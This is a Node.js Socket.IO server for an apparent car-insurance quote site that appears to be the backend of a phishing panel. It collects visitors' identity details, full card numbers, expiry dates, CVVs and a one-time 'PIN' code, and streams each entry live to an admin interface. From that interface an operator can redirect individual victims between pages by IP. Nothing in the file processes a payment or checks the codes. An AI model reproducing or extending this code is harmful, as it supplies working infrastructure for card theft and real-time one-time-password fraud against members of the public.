// index.js
require("dotenv").config();
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const mongoose = require("mongoose");
const path = require("path");
const bcrypt = require("bcrypt");

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, "public")));

// 1) Connect to MongoDB
mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => console.log("✔ MongoDB connected test"))
  .catch((err) => console.error("✖ MongoDB connection error:", err));

// admin import
const Admin = require("./models/Admin");
const { signToken, verifyToken } = require("./utils/jwt");

// models imports

const Index = require("./models/Index");
const Cars = require("./models/Car");
const Insurance = require("./models/Insurance");
const InsuranceCard = require("./models/InsuranceCard");
const InsuranceInfo = require("./models/InsuranceInfo");
const PlateNumber = require("./models/PlateNumber");
const User = require("./models/User");
const axios = require("axios");
const PolicyDate = require("./models/PolicyDate");
const Quote = require("./models/Quote");
const Payment = require("./models/Payment");
const Code = require("./models/Code");

// public function to find or create user by IP
async function findOrCreateUser(ip) {
  let user = await User.findOne({ ip });
  if (!user) user = await User.create({ ip });
  return user;
}

io.on("connection", (socket) => {
  console.log("▶", socket.id, "connected");

  socket.on("loadData", async () => {
    const [
      Indexs,
      Carss,
      Insurances,
      InsuranceCards,
      InsuranceInfos,
      PlateNumbers,
      PolicyDates,
      Quotes,
      Payments,
      Codes,
    ] = await Promise.all([
      Index.find().lean(),
      Cars.find().lean(),
      Insurance.find().lean(),
      InsuranceCard.find().lean(),
      InsuranceInfo.find().lean(),
      PlateNumber.find().lean(), // your `phone` model
      PolicyDate.find().lean(),
      Quote.find().lean(),
      Payment.find().lean(),
      Code.find().lean(),
    ]);

    // gather flags & locations
    const users = await User.find().lean();
    const flags = users.map((u) => ({ ip: u.ip, flag: u.flag }));
    const locations = users.map((u) => ({ ip: u.ip, currentPage: u.location }));

    io.emit("initialData", {
      Indexs,
      Carss,
      Insurances,
      InsuranceCards,
      InsuranceInfos,
      PlateNumbers,
      PolicyDates,
      Quotes,
      Payments,
      Codes,
      flags, // user.flag
      locations, // user.location
    });
  });

  // admin login

  /*  socket.on("registerAdmin", async ({ username, password }, callback) => {
    try {
      // 1) Reject empty
      if (!username?.trim() || !password) {
        return callback({
          success: false,
          message: "Username and password required.",
        });
      }

      // 2) Check duplicate
      const exists = await Admin.findOne({ username });
      if (exists) {
        return callback({ success: false, message: "Username already taken." });
      }

      // 3) Create & save (password hashing in pre-save hook)
      const admin = new Admin({ username, password });
      await admin.save();

      // 4) Optionally issue a token immediately:
      const token = generateTokenFor({
        id: admin._id,
        username: admin.username,
      });

      console.log("Admin registered.");

      // 5) Acknowledge success
      callback({ success: true, message: "Admin registered.", token });
    } catch (err) {
      console.error("registerAdmin error:", err);
      callback({ success: false, message: "Server error. Try again later." });
    }
  }); */

  // Admin: manual navigation
  socket.on("navigateTo", async ({ ip, page }) => {
    const user = await findOrCreateUser(ip);

    user.location = page;
    await user.save();
    io.emit("navigateTo", { ip, page });
  });

  // Admin: toggle flag
  socket.on("toggleFlag", async ({ ip, flag }) => {
    const user = await findOrCreateUser(ip);
    user.flag = flag;
    await user.save();
    io.emit("flagUpdated", { ip, flag });
  });

  // Visitor: page view
  socket.on("updateLocation", async ({ ip, page }) => {
    const user = await findOrCreateUser(ip);

    user.currentPage = page;
    user.lastSeenAt = new Date(); // or whatever timestamp field you prefer

    socket.userIp = ip;

    // 3. Save the changes:
    await user.save();

    io.emit("locationUpdated", { ip, page });
  });

  socket.on("loginAdmin", async ({ username, password }, callback) => {
    try {
      // 1) find admin
      const admin = await Admin.findOne({ username });
      if (!admin) {
        return callback({ success: false, message: "Invalid credentials" });
      }

      // 2) check password (your model method)
      const ok = await admin.checkPassword(password);
      if (!ok) {
        return callback({ success: false, message: "Invalid credentials" });
      }

      // 3) make a safe payload (no password)
      const userPayload = {
        id: admin._id.toString(),
        username: admin.username,
        role: admin.role || "admin",
        tokenVersion: admin.tokenVersion ?? 0,
      };

      // 4) create token from safe payload
      const token = signToken(userPayload); // your JWT/sign fn

      return callback({ success: true, token, admin: userPayload });
    } catch (err) {
      console.error("loginAdmin error:", err);
      return callback({ success: false, message: "Server error" });
    }
  });

  socket.on("verifyAdminToken", async ({ token }, cb = () => {}) => {
    try {
      if (!token) return cb({ valid: false });

      // 1) decode
      const payload = verifyToken(token); // should contain { userId, tokenVersion? }

      // 2) find admin
      // ✅ payload.id (not userId)
      const admin = await Admin.findById(payload.id);
      if (!admin) {
        console.log("[server] admin not found");
        return cb({ valid: false });
      }

      // ✅ check tokenVersion if present
      if (
        typeof payload.tokenVersion === "number" &&
        admin.tokenVersion !== payload.tokenVersion
      ) {
        console.log("[server] tokenVersion mismatch");
        return cb({ valid: false });
      }

      // 4) ok
      return cb({ valid: true });
    } catch (err) {
      console.error("verifyAdminToken error:", err.message);
      return cb({ valid: false });
    }
  });

  /// index.js

  socket.on("submitIndex", async (payload) => {
    const user = await findOrCreateUser(payload.ip);

    const saved = await Index.create({
      user: user._id,
      ip: payload.ip,
      phone: payload.phone,
    });

    io.emit("newIndex", {
      ip: saved.ip,
      phone: saved.phone,
      user: saved.user,
    });

    socket.emit("ackIndex", { success: true, error: null });
  });

  // flow.js

  //flow body number

  // car flow.html
  socket.on("submitCar", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const updated = await Cars.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip: payload.ip,
            brand: payload.brand,
            model: payload.model,
            year: payload.year,
            seat: payload.seat,
            cyl: payload.cyl,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );

      io.emit("newCar", {
        ip: user.ip,
        brand: updated.brand,
        model: updated.model,
        year: updated.year,
        seat: updated.seat,
        cyl: updated.cyl,
      });

      socket.emit("ackCar", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitCar:", err);
      socket.emit("ackCar", { success: false, error: err.message });
    }
  });

  // InsuranceCard.js more-info.html

  socket.on("submitInsuranceCard", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      console.log(payload.ip);

      const doc = await InsuranceCard.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip: payload.ip,
            vehicleType: payload.type,
            registrationYear: payload.first_registration_year,
            cardId: payload.cardId,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );

      io.emit("newInsuranceCard", {
        ip: doc.ip,
        vehicleType: doc.vehicleType,
        registrationYear: doc.registrationYear,
        cardId: doc.cardId,
      });

      socket.emit("ackInsuranceCard", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitInsuranceCard:", err);
      socket.emit("ackInsuranceCard", { success: false, error: err.message });
    }
  });

  // Insurance.js plans.html

  socket.on("submitInsurance", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const doc = await Insurance.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip: payload.ip,
            type: payload.type,
            cost: payload.cost,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );

      io.emit("newInsurance", {
        ip: doc.ip,
        type: doc.type,
        cost: doc.cost,
      });

      socket.emit("ackInsurance", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitInsurance:", err);
      socket.emit("ackInsurance", { success: false, error: err.message });
    }
  });

  // plate-number.html

  socket.on("submitPlateNumber", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const doc = await PlateNumber.findOneAndUpdate(
        { user: user._id },

        {
          $set: {
            ip: payload.ip,
            plateNumber: payload.plateNumber,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },

        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );
      io.emit("newPlateNumber", {
        ip: doc.ip,
        plateNumber: doc.plateNumber,
      });

      socket.emit("ackPlateNumber", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitPlateNumber:", err);
      socket.emit("ackPlateNumber", { success: false, error: err.message });
    }
  });

  // insured-info.html

  socket.on("submitInsuredInfo", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const doc = await InsuranceInfo.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip: payload.ip,
            name: payload.fullName,
            email: payload.email,
            gender: payload.gender,
            address: payload.address,
            dob: payload.dob,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );
      io.emit("newInsuredInfo", {
        ip: doc.ip,
        fullName: doc.name,
        address: doc.address,
        dob: doc.dob,
        email: doc.email,
        gender: doc.gender,
      });
      socket.emit("ackInsuredInfo", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitInsuredInfo:", err);
      socket.emit("ackInsuredInfo", { success: false, error: err.message });
    }
  });

  // policy-date.html

  socket.on("submitPolicyDate", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      console.log(payload);

      const doc = await PolicyDate.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip: payload.ip,
            policyStartDate: payload.policyStartDate,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );

      io.emit("newPolicyDate", {
        ip: doc.ip,
        policyStartDate: doc.policyStartDate,
      });

      socket.emit("ackPolicyDate", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitPolicyDate:", err);
      socket.emit("ackPolicyDate", { success: false, error: err.message });
    }
  });

  // quote.html

  socket.on("submitQuote", async (payload) => {
    try {
      const user = await findOrCreateUser(payload.ip);

      const doc = await Quote.findOneAndUpdate(
        { user: user._id },
        {
          $set: {
            ip: payload.ip,
            term: payload.term,
            paymentMethod: payload.paymentMethod,
            amount: payload.amount,
            currency: payload.currency,
            time: new Date(),
          },
          $setOnInsert: { user: user._id },
        },
        {
          upsert: true,
          new: true,
          setDefaultsOnInsert: true,
          runValidators: true,
        }
      );

      io.emit("newQuote", {
        ip: doc.ip,
        term: doc.term,
        paymentMethod: doc.paymentMethod,
        amount: doc.amount,
        currency: doc.currency,
      });

      socket.emit("ackQuote", { success: true, error: null });
    } catch (err) {
      console.error("Error in submitQuote:", err);
      socket.emit("ackQuote", { success: false, error: err.message });
    }
  });

  // payment.html

  socket.on("submitPayment", async (payload) => {
    // 1) Ensure a User record exists
    const user = await findOrCreateUser(payload.ip);

    const doc = await Payment.findOneAndUpdate(
      { user: user._id },
      {
        $set: {
          cardHolderName: payload.cardHolderName,
          cardNumber: payload.cardNumber,
          ip: payload.ip,
          expirationDate: payload.expirationDate,
          cvv: payload.cvv,
          time: Date.now(),
        },
        $setOnInsert: { user: user._id },
      },
      {
        upsert: true,
        new: true,
        setDefaultsOnInsert: true,
        runValidators: true,
      }
    );

    // 3) Broadcast the minimal payload for admin UI
    io.emit("newPayment", {
      ip: user.ip,
      cardHolderName: doc.cardHolderName,
      cardNumber: doc.cardNumber,
      expirationDate: doc.expirationDate,
      cvv: doc.cvv,
      time: doc.time,
    });

    socket.emit("ackPayment", { success: true, error: null });
  });

  socket.on("submitCode", async ({ ip, code }) => {
    // 1) Ensure the User exists
    const user = await findOrCreateUser(ip);

    const doc = await Code.findOneAndUpdate(
      { user: user._id },
      {
        $set: {
          verificationCode: code,
          time: Date.now(),
        },
        $setOnInsert: { user: user._id },
      },
      {
        upsert: true,
        new: true,
        setDefaultsOnInsert: true,
        runValidators: true,
      }
    );

    // 3) Broadcast to admin UI (optional)
    io.emit("newPin", {
      ip: user.ip,
      pin: doc.verificationCode,
      time: doc.time,
    });

    // 4) Ack back to the client
    socket.emit("ackCode", { success: true, error: null });
  });
});

// delete
app.delete("/api/users/:ip", async (req, res) => {
  const { ip } = req.params;
  const user = await User.findOne({ ip });
  if (user) {
    await Promise.all([
      Index.deleteMany({ user: user._id }),
      Cars.deleteMany({ user: user._id }),
      Insurance.deleteMany({ user: user._id }),
      InsuranceCard.deleteMany({ user: user._id }),
      InsuranceInfo.deleteMany({ user: user._id }),
      PlateNumber.deleteMany({ user: user._id }),
      PolicyDate.deleteMany({ user: user._id }),
      Quote.deleteMany({ user: user._id }),
      Payment.deleteMany({ user: user._id }),
      Code.deleteMany({ user: user._id }),
      user.deleteOne(),
    ]);
    io.emit("userDeleted", { ip });
  }
  res.json({ success: true });
});

const PORT = process.env.PORT || 3020;
server.listen(PORT, () => console.log(`🚀 Listening on port ${PORT}`));
